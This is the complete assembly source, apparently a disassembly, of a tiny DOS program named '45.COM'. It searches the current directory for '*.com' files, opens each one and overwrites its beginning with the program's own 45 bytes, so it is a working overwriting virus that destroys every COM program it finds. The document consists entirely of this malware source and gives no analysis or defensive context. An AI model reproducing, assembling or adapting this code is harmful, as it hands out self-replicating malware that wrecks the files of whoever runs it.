;        Disassembly of file :45.COM
;
;        Define common ASCII control codes.
;
HT       EQU   9
LF       EQU   10
FF       EQU   12
CR       EQU   13
EOF      EQU   26
;
Code_Seg SEGMENT PUBLIC
L002DH   EQU   0002DH
L009EH   EQU   0009EH
L3D02H   EQU   03D02H
Code_Seg ENDS
;
;
Code_Seg SEGMENT PUBLIC
;
         ASSUME CS:Code_Seg,DS:Code_Seg
         ORG   00100H
start:   MOV   DX,OFFSET L0127H
         MOV   AH,OFFSET 4EH
int_21:  INT   21H
         JC    return  
         MOV   DX,OFFSET L009EH
         MOV   AX,OFFSET L3D02H
         INT   21H
         JC    L0122H  
         XCHG  AX,BX
         MOV   DX,OFFSET start
         MOV   CX,OFFSET L002DH
         MOV   AH,OFFSET 40H
         INT   21H
         MOV   AH,OFFSET 3EH
         INT   21H
L0122H:  MOV   AH,OFFSET 4FH
         JMP   SHORT int_21  
return:  RET
L0127H:  DB    '*.com'
Code_Seg ENDS
         END   start   
